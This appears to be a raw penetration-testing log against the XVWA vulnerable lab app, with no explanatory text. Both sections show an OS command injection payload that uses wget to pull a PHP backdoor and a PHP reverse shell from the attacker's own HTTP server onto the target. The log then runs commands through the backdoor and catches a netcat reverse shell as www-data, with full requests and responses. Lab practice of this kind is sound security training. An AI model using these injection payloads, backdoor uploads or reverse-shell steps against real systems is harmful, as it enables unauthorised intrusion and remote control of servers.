UploadWebShellPhp1

romw@PentestServer3:~/Documentos/Pentesting/vulnhub/xvwa/2.-Pentest/2.-Http/Explotacion/2.-OsCommanInjection$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
10.0.0.18 - - [12/Apr/2020 15:46:00] "GET /simple-backdoor.php HTTP/1.1" 200 -

Request
GET /xvwa/vulnerabilities/cmdi/?target=;wget%20http://10.0.0.22:8000/simple-backdoor.php%20-O%20/var/www/html/xvwa/simple-backdoor.php HTTP/1.1
Accept-Encoding: gzip, deflate
Host: xvwa
User-Agent: commix/v3.0-stable (https://commixproject.com)
Accept: */*
Connection: close

Request
GET /xvwa/simple-backdoor.php?cmd=ls HTTP/1.1
Host: xvwa
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=mdform1hamm5m0lu5dn80uvog5
Upgrade-Insecure-Requests: 1

Response

HTTP/1.1 200 OK
Date: Sun, 12 Apr 2020 22:24:10 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.19
Vary: Accept-Encoding
Content-Length: 257
Connection: close
Content-Type: text/html

<pre>LICENSE
README.md
about.html
config.php
css
fonts
footer.html
header.php
home.html
img
index.php
instruction.php
instruction_home.html
js
login.php
logout.php
php-reverse-shell.php
php.ini
setup
sidepanel.php
simple-backdoor.php
vulnerabilities
</pre>

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

UploadWebShellPhp2

romw@PentestServer3:~/Documentos/Pentesting/vulnhub/xvwa/2.-Pentest/2.-Http/Explotacion/2.-OsCommanInjection$ python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
10.0.0.18 - - [12/Apr/2020 16:41:43] "GET /php-reverse-shell.php HTTP/1.1" 200 -

GET /xvwa/vulnerabilities/cmdi/?target=;wget%20http://10.0.0.22:8000/php-reverse-shell.php%20-O%20/var/www/html/xvwa/php-reverse-shell.php HTTP/1.1
Accept-Encoding: gzip, deflate
Host: xvwa
User-Agent: commix/v3.0-stable (https://commixproject.com)
Accept: */*
Connection: close

romw@PentestServer3:~/Documentos/Pentesting/vulnhub/xvwa/2.-Pentest/2.-Http/Explotacion/2.-OsCommanInjection/4.-WebShell$ nc -lvp 1234
listening on [any] 1234 ...

connect to [10.0.0.22] from xvwa.oadis.com.mx [10.0.0.18] 55668
Linux xvwa 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
 16:27:54 up  5:23,  6 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
xvwa     tty2                      11:05    5:22m  0.17s  0.12s -bash
xvwa     tty4                      11:05    5:22m  0.24s  0.10s -bash
xvwa     tty5                      11:05    5:22m  0.23s  0.11s -bash
xvwa     tty6                      11:05    5:22m  0.16s  0.12s -bash
xvwa     tty3                      11:05    5:22m  0.18s  0.12s -bash
xvwa     tty1                      11:05    5:22m  0.12s  0.08s -bash
uid=33(www-data) gid: not founda) groups=33(www-data)
$ $ $ $  0: can't access tty; job control turned off
$ $ $ $ /bin/sh: 4: 
$ 
$ whoami
www-data
$ ^C

GET /xvwa/php-reverse-shell.php HTTP/1.1
Host: xvwa
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=mdform1hamm5m0lu5dn80uvog5
Upgrade-Insecure-Requests: 1















